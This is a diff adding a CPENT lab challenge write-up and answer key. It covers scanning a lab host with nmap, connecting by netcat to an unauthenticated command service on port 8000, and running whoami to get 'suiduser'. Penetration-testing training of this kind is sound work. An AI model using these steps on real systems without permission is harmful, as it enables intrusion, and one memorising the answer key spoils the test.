@@ -1,0 +1,161 @@
+# CPENT Challenge 104 – Identify Initial Shell User
+
+## Challenge
+
+**Question:**
+
+> Identify the username of the currently logged-in user after obtaining the initial shell on `192.168.1.105`.
+
+**Target:**
+
+```text
+192.168.1.105
+```
+
+**Answer Format:**
+
+```text
+xxxxxxxx
+```
+
+**Final Answer:**
+
+```text
+suiduser
+```
+
+---
+
+## Step 1 – Enumerate the Target
+
+First, we scanned the target to identify open ports and services:
+
+```bash
+nmap -sV -sC 192.168.1.105
+```
+
+### Important Output
+
+```text
+PORT     STATE SERVICE   VERSION
+8000/tcp open  http-alt?
+```
+
+The service on port `8000` returned:
+
+```text
+Enter command:
+```
+
+Nmap also revealed an interesting server-side script:
+
+```text
+/opt/vulnsvc/vulnsvc.sh
+```
+
+This indicated that port `8000` was a custom command-based service.
+
+---
+
+## Step 2 – Connect to the Service
+
+We connected to port `8000` using Netcat:
+
+```bash
+nc 192.168.1.105 8000
+```
+
+The service displayed:
+
+```text
+Enter command:
+```
+
+This confirmed that the service accepts commands.
+
+---
+
+## Step 3 – Identify the Current User
+
+At the `Enter command:` prompt, we entered:
+
+```bash
+whoami
+```
+
+The service returned:
+
+```text
+suiduser
+```
+
+The `whoami` command displays the username of the currently logged-in user.
+
+---
+
+## Step 4 – Determine the Answer
+
+The challenge requires an 8-character username.
+
+The result was:
+
+```text
+suiduser
+```
+
+Count:
+
+```text
+s u i d u s e r
+1 2 3 4 5 6 7 8
+```
+
+It matches the required format:
+
+```text
+xxxxxxxx
+```
+
+---
+
+## Commands Used
+
+### 1. Service enumeration
+
+```bash
+nmap -sV -sC 192.168.1.105
+```
+
+### 2. Connect to the custom service
+
+```bash
+nc 192.168.1.105 8000
+```
+
+### 3. Find the current user
+
+Inside the Netcat session:
+
+```bash
+whoami
+```
+
+### Output
+
+```text
+suiduser
+```
+
+---
+
+## Final Answer
+
+```text
+suiduser
+```
+
+### Conclusion
+
+Port `8000` was running a custom command-based service. After connecting with Netcat, the `whoami` command identified the initial shell user as `suiduser`.
+
+**Challenge 104 → `suiduser`**
